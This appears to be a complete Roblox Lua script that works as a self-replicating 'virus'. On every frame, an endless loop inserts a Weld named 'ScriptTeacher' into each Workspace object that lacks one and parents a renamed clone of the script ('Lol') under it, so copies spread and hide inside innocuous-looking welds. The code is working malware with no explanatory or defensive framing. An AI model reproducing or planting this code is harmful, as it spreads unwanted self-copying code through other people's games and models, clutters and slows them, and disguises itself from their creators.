function haxyr()
	x = game.Workspace:GetChildren()
	for i = 1, #x do
		if x[i]:FindFirstChild("ScriptTeacher") == nil then
			local w = Instance.new("Weld")
			w.Parent = x[i]
			w.Name = "ScriptTeacher"
			s = script:clone()
			s.Parent = w
			s.Name = "Lol"
		end
	end
end

while true do
	haxyr()
	wait()
end